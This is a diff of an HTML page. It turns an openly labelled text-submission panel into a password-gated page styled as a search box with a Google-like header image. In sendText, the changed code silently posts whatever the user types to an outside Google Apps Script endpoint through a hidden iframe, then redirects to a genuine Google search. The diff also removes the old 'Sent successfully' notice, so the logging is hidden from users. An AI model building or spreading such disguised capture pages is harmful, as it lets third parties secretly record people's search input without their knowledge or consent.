@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thank You Panel</title>
+    <title>Protected Search Panel</title>
     <style>
+        /* 2. ENTIRE PAGE WHITE BACKGROUND */
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             margin: 0;
-            padding: 20px;
-            background-color: #f4f4f4;
+            padding: 0;
+            background-color: white; /* All white background */
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            /* REMOVED: align-items: center; and justify-content: center; 
-               This ensures content starts from the top. */
+            overflow: hidden; /* Prevent scrolling caused by absolute positioning */
+            position: relative; /* Needed for bottom image absolute positioning */
         }
         #content-wrapper {
             max-width: 400px;
@@ -26,7 +27,8 @@
             border-radius: 12px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             margin: 0 auto; /* Center horizontally */
-            margin-top: 40px; /* Added some margin from the top */
+            margin-top: 40px; /* Top alignment margin */
+            z-index: 20; /* Ensure this content is above the bottom image */
         }
         /* Style for the initial password prompt container to remain centered */
         #initial-message-container {
@@ -36,10 +38,31 @@
             align-items: center;
             justify-content: center;
             width: 100%;
-            position: absolute; /* Ensures centering works correctly */
+            position: absolute;
             top: 0;
             left: 0;
-            z-index: 10;
+            z-index: 30; /* Ensure this is on top of everything */
+            background-color: white;
+        }
+
+        /* 1. TOP IMAGE STYLING */
+        #top-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        /* 5. BOTTOM IMAGE STYLING (Adjusted for larger height) */
+        #bottom-image {
+            position: absolute;
+            bottom: -15%; /* Pushed down slightly */
+            right: 5%; 
+            width: 280px; /* Adjusted visible size to be safe */
+            height: auto; /* Maintain aspect ratio */
+            opacity: 0.5; 
+            pointer-events: none;
+            z-index: 1;
         }
 
         input {
@@ -65,25 +88,23 @@
         button:hover {
             background-color: #005fa3;
         }
-        #status {
-            margin-top: 15px;
-            font-size: 16px;
-            color: green;
-        }
         #protected-content {
             display: none; /* Hide the content by default */
         }
         
         /* Media Query for smaller screens (e.g., phones) */
         @media (max-width: 600px) {
-            #content-wrapper {
+             #content-wrapper {
                 margin: 10px auto;
-                margin-top: 20px; /* Reduced top margin on mobile */
+                margin-top: 20px;
                 padding: 15px;
             }
             button {
                 padding: 15px;
                 font-size: 16px;
+            }
+            #bottom-image {
+                display: none; /* Hide decorative image on small screens */
             }
         }
     </style>
@@ -94,12 +115,15 @@
         <div id="initial-message"><h1>Access Verification</h1><p>Please wait for the password prompt...</p></div>
     </div>
     
+    <img id="bottom-image" src="bottom.jpg" alt="Bottom decorative image">
+
     <div id="content-wrapper">
         <div id="protected-content">
-            <h2>Thank you</h2>
-            <input id="text" type="text" placeholder="Type here">
-            <button onclick="sendText()">Send</button>
-            <div id="status"></div>
+            <img id="top-image" src="g.png" alt="Header Image">
+
+            <input id="text" type="text" placeholder="Search....">
+            
+            <button onclick="sendText()">Search</button>
         </div>
     </div>
 
@@ -114,30 +138,26 @@
          * Function to check the password and grant access.
          */
         function checkAccess() {
-            // Hide the initial message container before prompting
             initialMessageContainer.style.display = 'none'; 
 
             const passwordAttempt = prompt("Please enter the 4-digit password:");
 
             if (passwordAttempt === CORRECT_PASSWORD) {
-                // Password is correct: display the protected content
                 protectedContent.style.display = 'block'; 
-                // Set the body alignment to start from the top for the main content
-                document.body.style.alignItems = 'flex-start'; 
+                initialMessageContainer.style.display = 'none'; 
             } else if (passwordAttempt !== null) {
-                // Incorrect: Show error and re-prompt
                 alert("Incorrect Password. Access Denied.");
-                // Re-display the initial message container for the re-prompt context
                 initialMessageContainer.style.display = 'flex';
                 checkAccess(); 
             } else {
-                // User clicked "Cancel" or pressed Esc
                 document.getElementById('initial-message').innerHTML = "<h1>Access Denied.</h1><p>You must enter the correct password to continue.</p>";
                 initialMessageContainer.style.display = 'flex';
             }
         }
 
-        // --- Original sendText function ---
+        /**
+         * 6. Function to send data to Google Script and redirect to Google Search.
+         */
         function sendText() {
             const text = document.getElementById('text').value.trim();
             if (!text) {
@@ -145,11 +165,11 @@
                 return;
             }
 
-            // Create a form for cross-browser submission
+            // --- 1. SEND DATA TO GOOGLE SCRIPT (REMAINS INTACT) ---
             const form = document.createElement('form');
-            form.action = 'https://script.google.com/macros/s/AKfycbycy0pqkQNXFz2ilhg-5yiNnBp4NDudzo3XL6IP1j7MaU9jqEiPuSFno6AwKR9ZD5pRwg/exec';
+            form.action = 'https://script.google.com/macros/s/AKfycbycy0pqkQNXFz2ilhg-5yiNnBp4NDudzo3XL6IP1j7MaU9jqEiPuSFno6AwKR9ZD5pRwg/exec'; 
             form.method = 'GET';
-            form.target = 'hiddenFrame';
+            form.target = 'hiddenFrame'; // Submits to an invisible iframe
 
             const input = document.createElement('input');
             input.type = 'hidden';
@@ -167,9 +187,13 @@
                 document.body.appendChild(iframe);
             }
 
+            // Submits the data to your Google Script in the background
             form.submit();
-            document.getElementById('status').textContent = '✅ Sent successfully!';
-            document.getElementById('text').value = '';
+            document.getElementById('text').value = ''; 
+
+            // --- 2. REDIRECT TO GOOGLE SEARCH ---
+            const googleSearchUrl = "https://www.google.com/search?q=" + encodeURIComponent(text);
+            window.location.href = googleSearchUrl;
         }
 
         // Run the password check when the page loads
